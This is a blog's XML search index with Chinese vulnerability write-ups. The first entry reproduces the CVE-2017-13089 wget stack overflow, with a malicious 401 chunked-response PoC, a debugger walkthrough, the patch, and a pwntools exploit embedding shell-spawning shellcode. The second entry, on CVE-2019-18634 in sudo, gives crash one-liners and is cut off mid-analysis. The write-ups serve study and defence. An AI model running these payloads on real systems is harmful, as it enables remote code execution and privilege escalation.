<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CVE-2017-13089 wget栈溢出</title>
    <url>/2020/06/20/CVE-2017-13089-wget%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
    <content><![CDATA[<p>参考网上的一篇文章教程，复现了一下 wget 1.19.1 组件版本的的一个栈溢出漏洞。漏洞的成因是由于对响应包处理不当导致的整数溢出，进而导致栈溢出。</p>
<a id="more"></a>

<h3 id="CVE-2017-13089-wget-栈溢出漏洞复现"><a href="#CVE-2017-13089-wget-栈溢出漏洞复现" class="headerlink" title="CVE-2017-13089 wget 栈溢出漏洞复现"></a><strong>CVE-2017-13089 wget 栈溢出漏洞复现</strong></h3><h4 id="Wget-描述"><a href="#Wget-描述" class="headerlink" title="Wget 描述"></a>Wget 描述</h4><p>GNU Wget（常简称为 Wget ）是一个在网络上进行下载的简单而强大的自由软件，其本身也是 GNU 计划的一部分。它的名字是 “World Wide Web” 和 “Get” 的结合，同时也隐含了软件的主要功能。当前它支持通过 HTTP、HTTPS，以及 FTP 这三个最常见的  TCP/IP 协议协议下载。</p>
<h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a><strong>影响版本</strong></h4><p>wget &lt;=1.19.1  影响系统范围如下：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">Ubuntu Ubuntu Linux 17.10  </span><br><span class="line">Ubuntu Ubuntu Linux 17.04  </span><br><span class="line">Ubuntu Ubuntu Linux 16.04 LTS  </span><br><span class="line">Ubuntu Ubuntu Linux 14.04 LTS  </span><br><span class="line">Redhat Virtualization Host 4  </span><br><span class="line">Redhat Enterprise Linux Workstation 7  </span><br><span class="line">Redhat Enterprise Linux<span class="built_in"> Server </span><span class="keyword">for</span> ARM 7  </span><br><span class="line">Redhat Enterprise Linux<span class="built_in"> Server </span>- TUS 7.4  </span><br><span class="line">Redhat Enterprise Linux<span class="built_in"> Server </span>- Extended Update Support 7.4  </span><br><span class="line">Redhat Enterprise Linux<span class="built_in"> Server </span>- AUS 7.4  </span><br><span class="line">Redhat Enterprise Linux<span class="built_in"> Server </span>- 4 Year Extended Update Support 7.4  </span><br><span class="line">Redhat Enterprise Linux<span class="built_in"> Server </span>(<span class="keyword">for</span> IBM Power LE) - 4 Year Extended Update Support 7.4  </span><br><span class="line">Redhat Enterprise Linux <span class="keyword">for</span> Scientific Computing 7  </span><br><span class="line">Redhat Enterprise Linux <span class="keyword">for</span> Power, little endian - Extended Update Supp 7.4  </span><br><span class="line">Redhat Enterprise Linux <span class="keyword">for</span> Power, little endian 7  </span><br><span class="line">Redhat Enterprise Linux <span class="keyword">for</span> Power, big endian - Extended Update Support 7.4  </span><br><span class="line">Redhat Enterprise Linux <span class="keyword">for</span> Power, big endian 7  </span><br><span class="line">Redhat Enterprise Linux <span class="keyword">for</span> IBM z Systems - Extended Update Support 7.4  </span><br><span class="line">Redhat Enterprise Linux <span class="keyword">for</span> IBM z Systems 7  </span><br><span class="line">Redhat Enterprise Linux EUS Compute Node 7.4  </span><br><span class="line">Redhat Enterprise Linux Desktop 7  </span><br><span class="line">Redhat Enterprise Linux 7  </span><br><span class="line">GNU wget 0</span><br></pre></td></tr></table></figure></div>

<h4 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a><strong>环境准备</strong></h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libneon27-gnutls-dev</span><br><span class="line">wget https://ftp.gnu.org/gnu/wget/wget-1.19.1.tar.gz</span><br><span class="line">tar -zxvf wget-1.19.1.tar.gz</span><br></pre></td></tr></table></figure></div>

<h4 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a><strong>编译安装</strong></h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">cd wget-1.19.1/</span><br><span class="line">mkdir build/ &amp; ./configure --prefix=$PWD/build/</span><br><span class="line">make -j8</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##安装好的二进制文件是存放在 --prefix 变量值的 bin/ 目录下：</span></span></span><br><span class="line">sudo make install</span><br><span class="line">cd build/</span><br></pre></td></tr></table></figure></div>



<h4 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a><strong>漏洞触发</strong></h4><p>该版本漏洞是由于 wget 组件在处理 401 状态码的数据响应包时，没有对读取的包做正负检查，导致的整数栈溢出。我们先触发一下这个漏洞。</p>
<p>1、新建poc文件，构造数据包</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">401</span> Not Authorized</span><br><span class="line"><span class="attribute">Content-Type</span>: text/plain; charset=UTF-8</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"></span><br><span class="line">-0xFFFFF000</span><br><span class="line"><span class="attributespan></span><br><span class="line"><span class="attribute">0</span></span><br></pre></td></tr></table></figure></div>

<p>2、开启端口监听</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 12667 &lt; poc</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/04/03/rq8heJ4fGW5YgP9.png" alt="img"></p>
<p>3、wget 触发漏洞</p>
<p>可以看到，wget 在 12667 端口处触发了栈溢出漏洞，导致程序服务 crach：</p>
<p><img src="https://i.loli.net/2021/04/03/zd3VPvNEMCTLAX7.png" alt="img"></p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a><strong>漏洞分析</strong></h4><p><strong>静态分析</strong></p>
<p>前文说了漏洞点是由于对 401 数据响应包的处理不当导致的，准确的说是由于 wget 在处理响应包时，对每个包进行分块之后，错误的将一个负数与整数进行比较，得到的负数的值作为内存复制函数的 len。</p>
<p>首先搜索 <code>skip_short_body</code> 函数，进入 <code>src/http.c</code> 源代码中进行分析：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">~/wget-1.19.1$ grep -rnl "skip_short_body" *</span><br><span class="line">build/bin/wget</span><br><span class="line">ChangeLog</span><br><span class="line">src/http.o</span><br><span class="line">src/http.c</span><br><span class="line">src/wget</span><br></pre></td></tr></table></figure></div>

<p>跟踪到 <code>src/http.c</code> 文件，3493行处，在这里会判断 wget 请求返回来的 http 状态码，即<code>statcode</code> ，当statcode 是 401（未认证）时会触发下面的 if 判断：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (statcode == HTTP_STATUS_UNAUTHORIZED)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Authorization is required.  */</span></span><br><span class="line">      <span class="keyword">uerr_t</span> auth_err = RETROK;</span><br><span class="line">      <span class="keyword">bool</span> retry;</span><br><span class="line">      <span class="comment">/* Normally we are not interested in the response body.</span></span><br><span class="line"><span class="comment">         But if we are writing a WARC file we are: we like to keep everyting.  */</span></span><br><span class="line">      <span class="keyword">if</span> (warc_enabled)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//判断 content-type 是否为 WARC </span></span><br><span class="line">            ...</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Since WARC is disabled, we are not interested in the response body.  */</span></span><br><span class="line">          <span class="keyword">if</span> (keep_alive &amp;&amp; !head_only</span><br><span class="line">              &amp;&amp; skip_short_body (sock, contlen, chunked_transfer_encoding))</span><br><span class="line">            CLOSE_FINISH (sock);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            CLOSE_INVALIDATE (sock);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>

<p>因为这里的 <code>content-type</code> 不是 <code>WARC</code>，所以会进入 else 分支，以此判断 <code>keep_alive</code>、<code>head_only</code>参数，接着调用 <code>skip_short_body</code> 这个函数。</p>
<p>跟进<code>skip_short_body</code> 函数：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">skip_short_body</span> <span class="params">(<span class="keyword">int</span> fd, wgint contlen, <span class="keyword">bool</span> chunked)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">enum</span> &#123;</span><br><span class="line">    SKIP_SIZE = <span class="number">512</span>,                <span class="comment">/* size of the download buffer */</span></span><br><span class="line">    SKIP_THRESHOLD = <span class="number">4096</span>        <span class="comment">/* the largest size we read */</span></span><br><span class="line">  &#125;;</span><br><span class="line">  wgint remaining_chunk_size = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">char</span> dlbuf[SKIP_SIZE + <span class="number">1</span>];</span><br><span class="line">  dlbuf[SKIP_SIZE] = <span class="string">'\0'</span>;        <span class="comment">/* so DEBUGP can safely print it */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If the body is too large, it makes more sense to simply close the</span></span><br><span class="line"><span class="comment">     connection than to try to read the body.  */</span></span><br><span class="line">  <span class="keyword">if</span> (contlen &gt; SKIP_THRESHOLD)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (contlen &gt; <span class="number">0</span> || chunked)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> ret;</span><br><span class="line">      <span class="keyword">if</span> (chunked)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (remaining_chunk_size == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">char</span> *<span class="built_in">line</span> = fd_read_line (fd);</span><br><span class="line">              <span class="keyword">char</span> *<span class="built_in">endl</span>;</span><br><span class="line">              <span class="keyword">if</span> (<span class="built_in">line</span> == <span class="literal">NULL</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">              remaining_chunk_size = strtol (<span class="built_in">line</span>, &amp;<span class="built_in">endl</span>, <span class="number">16</span>);</span><br><span class="line">              xfree (<span class="built_in">line</span>);</span><br><span class="line">    </span><br><span class="line">              <span class="keyword">if</span> (remaining_chunk_size == <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="built_in">line</span> = fd_read_line (fd);</span><br><span class="line">                  xfree (<span class="built_in">line</span>);</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">          contlen = MIN (remaining_chunk_size, SKIP_SIZE);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">      DEBUGP ((<span class="string">"Skipping %s bytes of body: ["</span>, number_to_static_string (contlen)));</span><br><span class="line">      ret = fd_read (fd, dlbuf, MIN (contlen, SKIP_SIZE), <span class="number">-1</span>);</span><br></pre></td></tr></table></figure></div>

<p>根据这段代码逻辑，我们可以理出一个简单的代码逻辑。 wget 在检测 short_body 的时候 先要检测出传输的块的大小，假若传入的块的大小的值不大于 4096 则进入进入这个漏洞的受害逻辑内。</p>
<p><code>contlen = MIN (remaining_chunk_size, SKIP_SIZE);</code> 只需小于512时，<code>contlen</code> 可控，综合上述代码逻辑，可以得出<code>remaining_chunk_size</code> 位负值时，<code>contlen</code>为可控向量。在后面的代码逻辑中，<code>fd_read()</code> 使用了该受控制的向量，引发了缓冲区溢出漏洞。</p>
<p>之后调用了 <code>fd_read</code> 函数，将响应体的内容复制到栈中，长度即为 <code>contlen</code> 变量的值。</p>
<p><code>fd_read</code> 函数封装了 <code>sock_read</code> 函数</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">fd_read (<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf, <span class="keyword">int</span> bufsize, <span class="keyword">double</span> timeout)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">transport_info</span> *<span class="title">info</span>;</span></span><br><span class="line">  LAZY_RETRIEVE_INFO (info);</span><br><span class="line">  <span class="keyword">if</span> (!poll_internal (fd, info, WAIT_FOR_READ, timeout))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> (info &amp;&amp; info-&gt;imp-&gt;reader)</span><br><span class="line">    <span class="keyword">return</span> info-&gt;imp-&gt;reader (fd, buf, bufsize, info-&gt;ctx);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> sock_read (fd, buf, bufsize);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>sock_read</code> 函数调用了 <code>read</code> 函数，在这里触发了栈溢出：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">sock_read (<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf, <span class="keyword">int</span> bufsize)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> res;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    res = <span class="built_in">read</span> (fd, buf, bufsize);</span><br><span class="line">  <span class="keyword">while</span> (res == <span class="number">-1</span> &amp;&amp; errno == EINTR);</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>动态分析</strong></p>
<p>使用gdb动态调试</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">gdb ./wget</span><br><span class="line">set args 127.0.0.1:12667</span><br><span class="line">b skip_short_body   #将断点定在skip_short_body函数入口</span><br></pre></td></tr></table></figure></div>

<p>运行程序，同时开启nc监听</p>
<p><img src="https://i.loli.net/2021/04/03/xaHd5Mq2RpiFL3g.png" alt="img"></p>
<p>在执行完 <code>fd_read_line</code> 函数后，观察寄存器，返回值 <code>line</code> 的值为 <code>-0xFFFFF000</code> 的指针：</p>
<p><img src="https://i.loli.net/2021/04/03/Z1DwRj276KHxdXn.png" alt="img"></p>
<p>往下，接着会调用 <code>strtol</code> 函数，第一个为 <code>line</code> 的值，第二个参数为栈上的变量，第三个参数为长度：</p>
<p><img src="https://i.loli.net/2021/04/03/4ptuLEJS8XqYROM.png" alt="img"></p>
<p>执行过<code>strtol</code> 函数之后，会将返回值赋值给 <code>remaining_chunk_size</code> 变量，此时这个变量的值为 <code>0xffffffff00001000</code>：</p>
<p><img src="https://i.loli.net/2021/04/03/fSMqb52UrkYixOR.png" alt="img"></p>
<p>在<code>skip_short_body</code>函数中，通过<code>contlen = MIN (remaining_chunk_size, SKIP_SIZE);</code>进行比较，得到的 <code>contlen</code> 值为<code>0x1000</code></p>
<p>此时我们来看<code>contlen = MIN (remaining_chunk_size, SKIP_SIZE);</code>中<code>SKIP_SIZE</code>的定义：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">skip_short_body</span> <span class="params">(<span class="keyword">int</span> fd, wgint contlen, <span class="keyword">bool</span> chunked)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">enum</span> &#123;</span><br><span class="line">    SKIP_SIZE = <span class="number">512</span>,                <span class="comment">/* size of the download buffer */</span></span><br><span class="line">    SKIP_THRESHOLD = <span class="number">4096</span>        <span class="comment">/* the largest size we read */</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>这里正数与负数进行比较，返回值就是0x1000。</li>
</ul>
<p>接着继续执行到 <code>fd_read</code> 函数，这个函数的第三个参数就是 <code>contlen</code> 的值，大小为 0x1000。</p>
<p><img src="https://i.loli.net/2021/04/03/2JKszlbeFpwP6R5.png" alt="img"></p>
<p><code>si</code> 跟进函数，一直执行到<code>sock_read</code>函数，<code>fd_read</code> 里面封装了 <code>sock_read</code> 函数</p>
<p><img src="https://i.loli.net/2021/04/03/L5vksoT4debf3PD.png" alt="img"></p>
<p>继续跟进<code>sock_read</code>函数，发现这个函数里调用了 read 函数，将 sock 通道里的内容（也就是 AAAA…）复制到栈空间上：</p>
<p><img src="https://i.loli.net/2021/04/03/WraQf7Pp65n1O4g.png" alt="img"></p>
<p><code>nbytes</code>为填充大小，<code>distance</code>算出的是复制前 buf 到返回地址的距离。</p>
<p>因为这个值太大，导致了栈空间发生溢出。<strong>进行填充后不会使得当前</strong> <strong>fd_read</strong> <strong>函数崩溃，而会溢出到</strong> <strong>skip_short_body</strong> <strong>这个函数的栈空间，覆盖了栈的返回地址</strong>，导致程序崩溃：</p>
<p><img src="https://i.loli.net/2021/04/03/bcAveum3C5l4q2X.png" alt="img"></p>
<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a><strong>POC</strong></h4><p><strong>payload生成exp</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"""HTTP/1.1 401 Not Authorized</span></span><br><span class="line"><span class="string">Content-Type: text/plain; charset=UTF-8</span></span><br><span class="line"><span class="string">Transfer-Encoding: chunked</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-0xFFFFF000</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">port = p64(<span class="number">6666</span>).replace(<span class="string">'\x00'</span>,<span class="string">''</span>)[::<span class="number">-1</span>] <span class="comment">#设置6666为监听端口</span></span><br><span class="line">sc = <span class="string">"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02"</span>+port+<span class="string">"\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05"</span></span><br><span class="line"></span><br><span class="line">payload += sc + (<span class="number">568</span>-len(sc))*<span class="string">'A'</span> <span class="comment">#栈偏移量568</span></span><br><span class="line">payload += <span class="string">"\x60\xd2\xff\xff\xff\x7f\x00\x00"</span> <span class="comment">#输入数据起始地址,根据情况需手动定位</span></span><br><span class="line">payload += <span class="string">"\n0\n"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'exp1'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure></div>

<p>编译exp1并执行</p>
<p>A窗口：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python</span> poc.<span class="keyword">py</span> nc -<span class="keyword">lp</span> <span class="number">6666</span> &lt; poc.<span class="keyword">py</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/04/03/Xzv6SfHk71D2QOn.png" alt="img"></p>
<p>B窗口：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">gdb ./wget </span><br><span class="line">r 127.0.0.1:6666</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/04/03/xoXF35DOGQEcVhA.png" alt="img"></p>
<p>C窗口：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">nc <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">6666</span></span><br></pre></td></tr></table></figure></div>

<p>执行完后，后续会在B窗口收到反弹shell</p>
<h4 id="漏洞补丁"><a href="#漏洞补丁" class="headerlink" title="漏洞补丁"></a><strong>漏洞补丁</strong></h4><p>更新的补丁将 strtol 函数的返回值 remaining_chunk_size 变量的值进行是否为负数的判断，如果是负数的话就之后 return False 从而防止整数的溢出。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(remaining_chunk_size &lt; <span class="number">0</span>)    </span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure></div>

<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h4><p><a href="https://xz.aliyun.com/t/7394#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/7394#toc-0</a></p>
]]></content>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-18634 sudo_提权漏洞分析</title>
    <url>/2020/05/01/CVE-2019-18634-sudo-%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>CVE-2019-18634是一个<code>sudo 提权漏洞</code>。影响sudo版本为<code>[1.7.1,1.8.31)</code>。在官方描述中只提及该漏洞可以在<code>1.8.26</code>前的版本中利用，实际上在1.8.26的版本中仍有利用的方式。</p>
<a id="more"></a>

<h3 id="CVE-2019-18634-linux提权漏洞复现"><a href="#CVE-2019-18634-linux提权漏洞复现" class="headerlink" title="CVE-2019-18634  linux提权漏洞复现"></a><strong>CVE-2019-18634  linux提权漏洞复现</strong></h3><h4 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a><strong>环境配置</strong></h4><ul>
<li>ubuntu18.04</li>
<li>sudo 1.8.25版本</li>
<li>gdb(pwndbg插件）pwntools</li>
</ul>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a><strong>漏洞分析</strong></h4><p><strong>pwfeedback 选项</strong></p>
<p>pwfeedback，也就是 password feedback，开启之后在输入密码的时候会有视觉反馈，显示*号， 如下图, 默认情况下不会开启，某些Linux发行版本(Linux Mint和Elementary OS)会默认开启这个选项。</p>
<p><img src="https://i.loli.net/2021/04/01/1uZKBqbt2NazeVk.png" alt="img"></p>
<p>开启的方法是在<strong>/etc/sudoers</strong> 文件中添加一行<strong>Defaults pwfeedback</strong></p>
<p><img src="https://i.loli.net/2021/04/01/wGZ1Pmt5OBlu8pA.png" alt="img"></p>
<p>下载编译<a href="https://www.sudo.ws/dist/sudo-1.8.25.tar.gz" target="_blank" rel="noopener">sudo 1.8.25 版本</a>的源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">wget https://www.sudo.ws/dist/sudo-1.8.25.tar.gz</span><br><span class="line">tar sudo-1.8.25.tar.gz</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">./configure </span><br><span class="line">make -j16  </span><br><span class="line">make install</span><br></pre></td></tr></table></figure></div>

<p>在测试过程中，系统自带的sudo是 1.8.21p1 版本， 安装位置在 /usr/bin/sudo</p>
<p>自己编译的版本安装位置在 <code>/usr/local/bin/sudo</code></p>
<p><img src="https://i.loli.net/2021/04/01/lysmMWwzj3urcJ9.png" alt="img"></p>
<p><strong>从poc定位漏洞点</strong></p>
<p>官方给出了两个 poc, poc1适用 <code>sudo 1.8.25p1</code> 以下的版本, poc2 则适用<code>sudo 1.8.26 - 1.8.30</code> , 下面我们将从漏洞触发定位到漏洞代码，并分析漏洞的成因</p>
<p><strong>poc1</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">perl -e 'print(("A" x 100 . "x&#123;00&#125;") x 50)' | sudo -S id </span><br><span class="line">Password: Segmentation fault</span><br></pre></td></tr></table></figure></div>

<p><strong>poc2</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> socat pty,link=/tmp/pty,waitslave <span class="built_in">exec</span>:<span class="string">"python -c 'print(("</span>A<span class="string">"*100+chr(0x15))*50)'"</span> &amp; </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo -S id &lt; /tmp/pty</span></span><br></pre></td></tr></table></figure></div>

<h4 id="poc1-分析"><a href="#poc1-分析" class="headerlink" title="poc1 分析"></a><strong>poc1 分析</strong></h4><p>poc1, <code>sudo -S</code> 表示从标准输入读取密码，密码这里传入的是50个 <code>&quot;AAAAA....x00&quot;</code>, 然后直接段错误</p>
<p>为了方便定位漏洞，我们可以用 <code>asan</code> 重新编译一下程序, 配置的时候加上<code>--enable-asan</code>选项即可</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">make clean </span><br><span class="line">./configure --enable-asan </span><br><span class="line">make -j16 </span><br><span class="line">make install</span><br></pre></td></tr></table></figure></div>

<p>运行 poc 之后可以看到下面的输出</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">perl -e 'print(("A"x100 . "\x&#123;00&#125;") x 50)' |sudo -S id</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/04/01/GQbN4idmZAu5WKq.png" alt="img"></p>
<p>从输出返回的结果来看，漏洞触发点是在<code>tgetpass.c</code>的 <code>getln</code>函数上，对应345行。 我们可以从<code>src/tgetpass.c</code>看看代码，定位关键部分：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *</span><br><span class="line">getln(<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf, <span class="keyword">size_t</span> bufsiz, <span class="keyword">int</span> feedback)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">size_t</span> left = bufsiz;</span><br><span class="line">    <span class="keyword">ssize_t</span> nr = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">char</span> *cp = buf;</span><br><span class="line">    <span class="keyword">char</span> c = <span class="string">'\0'</span>;</span><br><span class="line">    debug_decl(getln, SUDO_DEBUG_CONV)</span><br><span class="line">    <span class="keyword">if</span> (left == <span class="number">0</span>) &#123;</span><br><span class="line">    errno = EINVAL;</span><br><span class="line">    debug_return_str(<span class="literal">NULL</span>);		<span class="comment">/* sanity */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (--left) &#123;</span><br><span class="line">    nr = <span 